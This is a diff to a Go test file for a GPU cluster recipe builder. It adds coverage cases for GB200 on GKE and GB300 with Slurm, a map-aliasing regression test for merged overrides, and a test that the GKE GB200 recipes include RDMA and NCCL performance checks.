 		// H100 EKS Ubuntu variants
@@ -2328,6 +2978,10 @@ func TestNFDTopologyUpdater_OverlayCoverage(t *testing.T) {
 		{"h100-gke-cos-training-kubeflow", criteria{CriteriaServiceGKE, CriteriaAcceleratorH100, CriteriaOSCOS, CriteriaIntentTraining, CriteriaPlatformKubeflow}, true},
 		{"h100-gke-cos-training-slurm", criteria{CriteriaServiceGKE, CriteriaAcceleratorH100, CriteriaOSCOS, CriteriaIntentTraining, CriteriaPlatformSlurm}, true},
 		{"h100-gke-cos-inference-dynamo", criteria{CriteriaServiceGKE, CriteriaAcceleratorH100, CriteriaOSCOS, CriteriaIntentInference, CriteriaPlatformDynamo}, true},
+		// GB200 GKE COS platform variants (GKE uses COS, no Ubuntu variant)
+		{"gb200-gke-cos-training-kubeflow", criteria{CriteriaServiceGKE, CriteriaAcceleratorGB200, CriteriaOSCOS, CriteriaIntentTraining, CriteriaPlatformKubeflow}, true},
+		{"gb200-gke-cos-training-slurm", criteria{CriteriaServiceGKE, CriteriaAcceleratorGB200, CriteriaOSCOS, CriteriaIntentTraining, CriteriaPlatformSlurm}, true},
+		{"gb200-gke-cos-inference-dynamo", criteria{CriteriaServiceGKE, CriteriaAcceleratorGB200, CriteriaOSCOS, CriteriaIntentInference, CriteriaPlatformDynamo}, true},
 		// GB200 EKS Ubuntu variants
 		{"gb200-eks-ubuntu-training", criteria{CriteriaServiceEKS, CriteriaAcceleratorGB200, CriteriaOSUbuntu, CriteriaIntentTraining, ""}, true},
 		{"gb200-eks-ubuntu-inference", criteria{CriteriaServiceEKS, CriteriaAcceleratorGB200, CriteriaOSUbuntu, CriteriaIntentInference, ""}, true},
@@ -2337,6 +2991,7 @@ func TestNFDTopologyUpdater_OverlayCoverage(t *testing.T) {
 		{"gb300-eks-ubuntu-training", criteria{CriteriaServiceEKS, CriteriaAcceleratorGB300, CriteriaOSUbuntu, CriteriaIntentTraining, ""}, true},
 		{"gb300-eks-ubuntu-inference", criteria{CriteriaServiceEKS, CriteriaAcceleratorGB300, CriteriaOSUbuntu, CriteriaIntentInference, ""}, true},
 		{"gb300-eks-ubuntu-training-kubeflow", criteria{CriteriaServiceEKS, CriteriaAcceleratorGB300, CriteriaOSUbuntu, CriteriaIntentTraining, CriteriaPlatformKubeflow}, true},
+		{"gb300-eks-ubuntu-training-slurm", criteria{CriteriaServiceEKS, CriteriaAcceleratorGB300, CriteriaOSUbuntu, CriteriaIntentTraining, CriteriaPlatformSlurm}, true},
 		{"gb300-eks-ubuntu-inference-dynamo", criteria{CriteriaServiceEKS, CriteriaAcceleratorGB300, CriteriaOSUbuntu, CriteriaIntentInference, CriteriaPlatformDynamo}, true},
 		// GB200 OKE Ubuntu variants
 		{"gb200-oke-ubuntu-training", criteria{CriteriaServiceOKE, CriteriaAcceleratorGB200, CriteriaOSUbuntu, CriteriaIntentTraining, ""}, true},
@@ -2389,7 +3044,7 @@ func TestNFDTopologyUpdater_OverlayCoverage(t *testing.T) {
 				cr.Platform = tt.c.platform
 			}
 
-			result, err := builder.BuildFromCriteria(ctx, cr)
+			result, err := builder.BuildFromCriteria(ctx, cr, tcpxoRequiredBuildOpts(cr)...)
 			if err != nil {
 				t.Fatalf("BuildFromCriteria(%+v): %v", tt.c, err)
 				return
@@ -2483,6 +3138,38 @@ func TestDeepMergeMap_NoSliceAliasing(t *testing.T) {
 	}
 }
 
+// TestRecipeMetadataSpecMerge_DoesNotCorruptSourceOverrides covers Merge's
+// initial componentMap population: s.ComponentRefs can itself alias a cached
+// source (e.g. initBaseMergedSpec copies s.Base.Spec.ComponentRefs by
+// struct, which doesn't deep-copy the Overrides map). Without cloning on
+// entry, a second layer's Overrides for the same component would be
+// deep-merged straight into that aliased map, corrupting the cached source
+// for every later build that reuses it.
+func TestRecipeMetadataSpecMerge_DoesNotCorruptSourceOverrides(t *testing.T) {
+	source := RecipeMetadataSpec{
+		ComponentRefs: []ComponentRef{
+			{Name: "x", Overrides: map[string]any{"a": 1}},
+		},
+	}
+
+	// Mirrors initBaseMergedSpec's copy pattern: a struct-level copy that
+	// leaves the Overrides map aliased to source.
+	merged := RecipeMetadataSpec{
+		ComponentRefs: make([]ComponentRef, len(source.ComponentRefs)),
+	}
+	copy(merged.ComponentRefs, source.ComponentRefs)
+
+	merged.Merge(&RecipeMetadataSpec{
+		ComponentRefs: []ComponentRef{
+			{Name: "x", Overrides: map[string]any{"b": 2}},
+		},
+	})
+
+	if _, leaked := source.ComponentRefs[0].Overrides["b"]; leaked {
+		t.Fatalf("source was mutated by the merge: %#v", source.ComponentRefs[0].Overrides)
+	}
+}
+
 // TestRecipeResultNormalizeKind pins the ingest-boundary kind contract: the
 // legacy shapes this API accepted through v0.18.0 are rewritten to the
 // canonical kind so the emitted artifact reloads, the canonical value is a
@@ -2509,7 +3196,7 @@ func TestRecipeResultNormalizeKind(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			t.Parallel()
 
-			r := &RecipeResult{Kind: tt.kind}
+			r := &RecipeResult{APIVersion: RecipeResultAPIVersion, Kind: tt.kind}
 			err := r.NormalizeKind()
 			if (err != nil) != tt.wantErr {
 				t.Fatalf("NormalizeKind() error = %v, wantErr %v", err, tt.wantErr)
@@ -2517,7 +3204,7 @@ func TestRecipeResultNormalizeKind(t *testing.T) {
 			if r.Kind != tt.wantKind {
 				t.Errorf("Kind = %q, want %q", r.Kind, tt.wantKind)
 			}
-			if tt.wantErr && !stderrors.Is(err, errors.New(errors.ErrCodeInvalidRequest, "")) {
+			if tt.wantErr && errorstest.ReportedCode(err) != errors.ErrCodeInvalidRequest {
 				t.Errorf("error code = %v, want %v", err, errors.ErrCodeInvalidRequest)
 			}
 		})
@@ -2532,5 +3219,72 @@ func TestRecipeResultNormalizeKindNilReceiver(t *testing.T) {
 	var r *RecipeResult
 	if err := r.NormalizeKind(); err != nil {
 		t.Errorf("NormalizeKind() on nil receiver = %v, want nil", err)
+	}
+}
+
+// TestGB200GKEIncludesRDMA: gke+gb200+cos must resolve to the GB200 GKE
+// leaf (not gke-cos + gb200-any) and keep gke-gb200-rdma plus the
+// dma-buf kernel-module ConfigMap.
+func TestGB200GKEIncludesRDMA(t *testing.T) {
+	builder := NewBuilder()
+	if builder == nil {
+		t.Fatal("NewBuilder() returned nil")
+	}
+	leaves := []struct {
+		label    string
+		intent   CriteriaIntentType
+		platform CriteriaPlatformType // empty for the unspecialized base leaf
+		// wantPerf is explicit per leaf. The Slurm leaf does not declare
+		// nccl-all-reduce-bw-nvls even though its intent is training, so
+		// this cannot be derived from intent alone.
+		wantPerf bool
+	}{
+		{"training", CriteriaIntentTraining, "", true},
+		{"inference", CriteriaIntentInference, "", false},
+		{"training-kubeflow", CriteriaIntentTraining, CriteriaPlatformKubeflow, true},
+		{"training-slurm", CriteriaIntentTraining, CriteriaPlatformSlurm, false},
+		{"inference-dynamo", CriteriaIntentInference, CriteriaPlatformDynamo, false},
+	}
+
+	ctx := context.Background()
+	for _, leaf := range leaves {
+		cr := NewCriteria()
+		cr.Service = CriteriaServiceGKE
+		cr.Accelerator = CriteriaAcceleratorGB200
+		cr.OS = CriteriaOSCOS
+		cr.Intent = leaf.intent
+		cr.Platform = leaf.platform
+		result, err := builder.BuildFromCriteria(ctx, cr)
+		if err != nil {
+			t.Fatalf("BuildFromCriteria(gke/gb200/cos/%s): %v", leaf.label, err)
+		}
+		if result.GetComponentRef("gke-gb200-rdma") == nil {
+			t.Errorf("gke-gb200-rdma missing from resolved gke/gb200/cos/%s recipe", leaf.label)
+		}
+		gpuOp := result.GetComponentRef("gpu-operator")
+		if gpuOp == nil {
+			t.Fatalf("gpu-operator missing from resolved gke/gb200/cos/%s recipe", leaf.label)
+		}
+		km, ok := gpuOp.Overrides["driver"].(map[string]any)
+		if !ok {
+			t.Errorf("gpu-operator.driver override missing for gke/gb200/cos/%s", leaf.label)
+			continue
+		}
+		cfg, ok := km["kernelModuleConfig"].(map[string]any)
+		if !ok || cfg["name"] != "nvidia-kernel-module-params" {
+			t.Errorf("kernelModuleConfig.name = %v, want nvidia-kernel-module-params for gke/gb200/cos/%s", km["kernelModuleConfig"], leaf.label)
+		}
+		checkPresent := performanceCheckPresent(result.Validation, "nccl-all-reduce-bw-nvls")
+		floor, floorFound := findPerformanceConstraint(result.Validation, "nccl-all-reduce-bw-nvls")
+		if leaf.wantPerf {
+			if !checkPresent {
+				t.Errorf("performance check nccl-all-reduce-bw-nvls missing for gke/gb200/cos/%s", leaf.label)
+			}
+			if !floorFound || floor != ">= 250" {
+				t.Errorf("nccl-all-reduce-bw-nvls = %q found=%v, want >= 250 for gke/gb200/cos/%s", floor, floorFound, leaf.label)
+			}
+		} else if checkPresent || floorFound {
+			t.Errorf("gke/gb200/cos/%s must not declare NCCL performance; check=%v floor=%q", leaf.label, checkPresent, floor)
+		}
 	}
 }
